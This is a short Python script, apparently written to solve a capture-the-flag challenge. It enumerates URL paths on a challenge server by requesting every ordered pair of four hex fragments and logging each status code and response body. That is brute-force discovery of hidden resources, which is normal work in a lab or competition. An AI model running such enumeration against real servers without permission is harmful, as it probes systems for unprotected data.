import itertools
import requests

# Input: 2 UUIDs

# === USER CONFIGURATION ===
base_url = "https://target-flask.chals.io"  # Replace with the actual domain
hex_chunks = [
    '0ecb22','4d0633','5cfea3','d6c97d'
]  # User-provided list of hex chunks

output_file = "sapsoft_results.txt"
timeout = 5  # Seconds to wait for each request

# === MAIN LOGIC ===
def main():
    total_combos = len(hex_chunks) ** 2
    count = 0

    with open(output_file, "w", encoding="utf-8") as out:
        for uuid1, uuid2 in itertools.permutations(hex_chunks, 2):
            url = f"{base_url}/apps_per-SAPSOFT/p/{uuid1}/{uuid2}"
            count += 1
            print(f"[{count}] Testing: {url}")

            try:
                response = requests.get(url, timeout=timeout)
                result = f"URL: {url} | Status: {response.status_code} | Body: {response.text[:200]}"
                print(f" → Status: {response.status_code}")
                if response.status_code == 200:
                    print(" → ✅ Success")
            except requests.RequestException as e:
                result = f"URL: {url} | ERROR: {str(e)}"

            out.write(result + "\n")

    print(f"Finished testing. Results saved to {output_file}")

if __name__ == "__main__":
    main()
